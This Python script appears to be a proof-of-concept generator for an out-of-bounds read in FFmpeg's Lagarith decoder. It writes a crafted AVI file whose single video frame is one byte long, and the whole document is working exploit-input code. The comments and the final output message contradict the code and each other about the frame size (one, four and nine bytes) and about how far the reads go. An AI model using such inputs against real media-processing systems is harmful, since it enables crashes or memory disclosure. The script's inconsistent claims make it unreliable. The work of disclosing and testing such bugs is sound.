#!/usr/bin/env python3
"""
PoC generator for VULN 001:
Out-of-Bounds Read via Missing buf_size Check in lag_decode_frame
File: libavcodec/lagarith.c, Function: lag_decode_frame()
"""

import struct
import sys

def fourcc(s):
    return s.encode('ascii')

def chunk(tag, data):
    """Build a RIFF chunk: tag(4) + size(4LE) + data"""
    return fourcc(tag) + struct.pack('<I', len(data)) + data

def list_chunk(list_type, data):
    """Build a LIST chunk: 'LIST'(4) + size(4LE) + list_type(4) + data"""
    inner = fourcc(list_type) + data
    return fourcc('LIST') + struct.pack('<I', len(inner)) + inner

def build_avih(width, height, num_streams, total_frames):
    """Build AVI main header (56 bytes)"""
    # AVIMAINHEADER
    dwMicroSecPerFrame = 40000      # 25 fps
    dwMaxBytesPerSec = 0
    dwPaddingGranularity = 0
    dwFlags = 0x10                  # AVIF_HASINDEX
    dwTotalFrames = total_frames
    dwInitialFrames = 0
    dwStreams = num_streams
    dwSuggestedBufferSize = 48
    dwWidth = width
    dwHeight = height
    dwReserved = [0, 0, 0, 0]
    data = struct.pack('<IIIIIIIIII',
        dwMicroSecPerFrame,
        dwMaxBytesPerSec,
        dwPaddingGranularity,
        dwFlags,
        dwTotalFrames,
        dwInitialFrames,
        dwStreams,
        dwSuggestedBufferSize,
        dwWidth,
        dwHeight,
    )
    data += struct.pack('<IIII', 0, 0, 0, 0)  # dwReserved
    return data  # 56 bytes

def build_strh(width, height):
    """Build AVI stream header for video (56 bytes)"""
    # AVISTREAMHEADER
    fccType = b'vids'
    fccHandler = b'LAGS'
    dwFlags = 0
    wPriority = 0
    wLanguage = 0
    dwInitialFrames = 0
    dwScale = 1
    dwRate = 25
    dwStart = 0
    dwLength = 1        # 1 frame
    dwSuggestedBufferSize = 48
    dwQuality = 0xFFFFFFFF
    dwSampleSize = 0
    # rcFrame: left, top, right, bottom (each 16-bit)
    rcFrame = struct.pack('<hhhh', 0, 0, width, height)

    data = fccType + fccHandler
    data += struct.pack('<IHH', dwFlags, wPriority, wLanguage)
    data += struct.pack('<IIIIIII',
        dwInitialFrames,
        dwScale,
        dwRate,
        dwStart,
        dwLength,
        dwSuggestedBufferSize,
        dwQuality,
    )
    data += struct.pack('<I', dwSampleSize)
    data += rcFrame
    return data  # 56 bytes

def build_strf(width, height):
    """Build BITMAPINFOHEADER for Lagarith (40 bytes)"""
    LAGS = 0x5347414C   # 'LAGS' as little-endian DWORD
    biSize = 40
    biWidth = width
    biHeight = height
    biPlanes = 1
    biBitCount = 24
    biCompression = LAGS
    biSizeImage = width * height * 3
    biXPelsPerMeter = 0
    biYPelsPerMeter = 0
    biClrUsed = 0
    biClrImportant = 0
    data = struct.pack('<IiiHHIIiiII',
        biSize,
        biWidth,
        biHeight,
        biPlanes,
        biBitCount,
        biCompression,
        biSizeImage,
        biXPelsPerMeter,
        biYPelsPerMeter,
        biClrUsed,
        biClrImportant,
    )
    return data  # 40 bytes

def build_avi():
    width = 4
    height = 4
    total_frames = 1

    # Stream header list
    strh_data = build_strh(width, height)
    strf_data = build_strf(width, height)
    strl_data = chunk('strh', strh_data) + chunk('strf', strf_data)
    strl_list = list_chunk('strl', strl_data)

    # AVI main header
    avih_data = build_avih(width, height, 1, total_frames)
    hdrl_data = chunk('avih', avih_data) + strl_list
    hdrl_list = list_chunk('hdrl', hdrl_data)

    # Tiny video frame — only 1 byte, far less than the 9 bytes
    # lag_decode_frame() reads buf[0], buf+1, buf+5 without checking buf_size.
    # FRAME_SOLID_GRAY = 5: decoder reads buf[1] as fill color after checking type.
    # With buf_size=1, reads at buf+1..buf+8 are all OOB.
    frame_data = b'\x05'  # 1 byte — FRAME_SOLID_GRAY, triggers OOB read
    frame_chunk = chunk('00dc', frame_data)

    # movi list
    movi_data = frame_chunk
    movi_list = list_chunk('movi', movi_data)

    # idx1 index entry
    # offset is relative to start of movi data (after 'movi' fourcc = 4 bytes)
    # movi_list = LIST(4) + size(4) + 'movi'(4) + movi_data
    # The frame chunk starts right after 'movi' fourcc, so offset = 0 relative to after 'movi'
    # But AVI idx1 offsets are typically relative to start of movi data (after the 'movi' tag)
    chunk_offset = 4   # offset past 'movi' fourcc to start of '00dc' chunk
    idx1_entry = (
        b'00dc'                         # chunk id
        + struct.pack('<I', 0x10)       # flags: AVIIF_KEYFRAME
        + struct.pack('<I', chunk_offset)  # offset from movi start
        + struct.pack('<I', len(frame_data))  # chunk data size
    )
    idx1_chunk = chunk('idx1', idx1_entry)

    # Full AVI RIFF
    avi_data = hdrl_list + movi_list + idx1_chunk
    riff = fourcc('RIFF') + struct.pack('<I', len(avi_data) + 4) + fourcc('AVI ') + avi_data

    return riff

if __name__ == '__main__':
    out = 'vuln_001_input.avi'
    data = build_avi()
    with open(out, 'wb') as f:
        f.write(data)
    print(f"[*] Written {len(data)} bytes to {out}")
    print(f"[*] Frame data is only 4 bytes — lag_decode_frame() will read OOB at buf[0..12]")
